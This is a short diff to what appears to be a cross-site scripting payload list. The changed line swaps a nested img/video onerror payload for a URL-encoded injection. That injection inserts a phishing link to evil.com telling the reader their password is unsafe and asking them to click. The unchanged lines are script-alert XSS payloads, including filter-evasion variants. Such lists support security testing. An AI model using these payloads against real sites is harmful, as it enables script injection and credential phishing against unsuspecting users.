@@ -1,4 +1,4 @@
-<img src= <video><source onerror="javascript:alert(1)"> onerror=alert(0)>
+<img src= %22%0D%0A/%3E%3Ch1%3E%3Ca%20href%3Dhttps://evil.com%3EYour%20password%20is%20currently%20unsafe,%20please%20click%20the%20link%20to%20update%20the%20information%3C/a%3E%3C/h1%3E/ onerror=alert(0)>
 <script>alert('XSS')</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
